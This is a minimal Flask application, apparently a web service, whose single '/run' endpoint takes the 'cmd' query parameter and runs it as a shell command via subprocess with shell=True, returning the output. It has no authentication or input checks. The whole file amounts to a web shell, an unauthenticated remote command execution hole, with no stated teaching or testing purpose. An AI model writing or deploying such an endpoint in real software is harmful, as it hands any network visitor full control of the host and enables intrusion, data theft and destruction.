import subprocess
from flask import Flask, request

app = Flask(__name__)

@app.route('/run')
def run_command():
    cmd = request.args.get('cmd')
    result = subprocess.run(cmd, shell=True, capture_output=True)
    return result.stdout
